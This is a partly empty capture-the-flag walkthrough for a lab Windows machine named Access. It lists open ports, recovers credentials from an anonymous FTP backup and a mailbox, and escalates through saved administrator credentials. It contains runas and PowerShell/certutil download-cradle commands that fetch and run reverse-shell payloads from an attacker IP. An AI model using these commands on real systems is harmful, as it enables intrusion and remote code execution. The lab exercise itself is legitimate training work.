Name & IP Address of Machine:
> ACCESS : `10.10.10.98`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->



## Synopsis


## Enumeration
Opened Ports: 
- [ ] 21 (FTP)
- [ ] 23 (TELNET)
- [ ] 80 (WEB-SERVER)



## FootHold
- Anonymous login allowed, there were two file backup.mdb and access.zip. Backup.mdb contains password.
    ```bash
    auth_user
    id,username,password,Status,last_login,RoleID,Remark
    25,"admin","admin",1,"08/23/18 21:11:47",26,
    27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
    28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
    ```
- Unzip Access Control.zip file with passwd `access4u@security` and you will get a pst file which is outlook mail.
- Convert it to mbox file format with `readpst` command and you will get a password for enginner and a username.
  
    `4Cc3ssC0ntr0ller`
    `john`
- Telent with user security and run jaws-enum
- Find out that administrator credentials are saved.
- You can run cmd as administrator with following command.
    ```bash
    runas /savecred /user:ACCESS\Administrator "\\10.10.14.28\hood\hood.exe" #hood.exe lport=4444,lhost=tun0
    ```
 




```bash
certutil.exe -urlcache -split -f http://10.10.14.28:8000/hood.exe  #Blocked by defender
Powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/Invoke-PowerShellTcp.ps1')
(New-Object Net.WebClient).downloadFile('http://10.10.14.28:8000/winpeas.exe','winpeas.exe') # Blocked by defender
Powershell Invoke-WebRequest http://10.10.14.28:8000/hood.exe -OutFile hood.exe 
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/jaws-enum.ps1')
(New-Object Net.WebClient).downloadFile('http://10.10.14.28:8000/jaws-enum.ps1','jenum.ps1')




```
## Lateral Movement

## Privilege Escalation



<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->
  






